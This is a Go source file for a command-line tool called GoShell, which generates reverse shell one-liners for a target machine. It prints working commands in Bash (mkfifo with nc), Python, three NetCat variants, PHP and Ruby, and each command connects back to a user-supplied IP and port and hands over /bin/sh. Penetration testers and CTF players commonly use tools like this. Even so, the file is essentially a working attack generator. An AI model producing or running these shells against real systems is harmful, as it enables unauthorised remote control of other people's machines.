package main

import (
	"fmt"
	"log"
	"os"
	"sort"

	. "github.com/logrusorgru/aurora"
	"github.com/urfave/cli"
)

func main() {
	app := cli.NewApp()
	app.Name = "GoShell"
	app.Usage = "Generate reverse shells in command line"

	myFlags := []cli.Flag{
		&cli.StringFlag{
			Name:  "ip",
			Value: "127.0.0.1",
		},
		&cli.StringFlag{
			Name:  "port",
			Value: "8080",
		},
	}

	app.Commands = []cli.Command{
		{
			Name:  "bash",
			Usage: "Generate a Bash reverse shell",
			Flags: myFlags,
			Action: func(c *cli.Context) error {
				fmt.Printf("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f\n", c.String("ip"), c.String("port"))
				return nil
			},
		},
		{
			Name:  "py",
			Usage: "Generate a Python reverse shell",
			Flags: myFlags,
			Action: func(c *cli.Context) error {
				fmt.Printf("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n", c.String("ip"), c.String("port"))
				return nil
			},
		},
		{
			Name:  "nc",
			Usage: "Generate NetCat reverse shells",
			Flags: myFlags,
			Action: func(c *cli.Context) error {
				fmt.Print(fmt.Sprint(Magenta("#1: ")))
				fmt.Printf("nc -e /bin/sh %s %s\n", c.String("ip"), c.String("port"))

				fmt.Print(fmt.Sprint(Magenta("#2: ")))
				fmt.Printf("/bin/sh | nc %s %s\n", c.String("ip"), c.String("port"))

				fmt.Print(fmt.Sprint(Magenta("#3: ")))
				fmt.Printf("rm -f /tmp/p; mknod /tmp/p p && nc %s %s 0/tmp/p\n", c.String("ip"), c.String("port"))
				return nil
			},
		},
		{
			Name:  "php",
			Usage: "Generate a PHP reverse shell",
			Flags: myFlags,
			Action: func(c *cli.Context) error {

				fmt.Print(fmt.Sprint(Green("(Assumes TCP uses file descriptor 3. If it doesn't work, try 4,5, or 6)\n")))
				fmt.Printf("php -r '$sock=fsockopen(\"%s\",%s);exec(\"/bin/sh -i <&3 >&3 2>&3\");'", c.String("ip"), c.String("port"))

				return nil
			},
		},
		{
			Name:  "ruby",
			Usage: "Generate a Ruby reverse shell",
			Flags: myFlags,
			Action: func(c *cli.Context) error {
				fmt.Printf("ruby -rsocket -e'f=TCPSocket.open(\"%s\",%s).to_i;exec sprintf(\"/bin/sh -i <&%%d >&%%d 2>&%%d\",f,f,f)'", c.String("ip"), c.String("port"))
				return nil
			},
		},
	}

	// Start message
	fmt.Print(fmt.Sprint(Blue("GoShell - (c)2020 - ezekiel\n").Bold()))
	fmt.Print(fmt.Sprint(Red("Note that those shells may not work on your target !\n\n").Bold()))

	// Sort commands list in help panel by name
	sort.Sort(cli.CommandsByName(app.Commands))
	err := app.Run(os.Args)
	if err != nil {
		log.Fatal(err)
	}
}
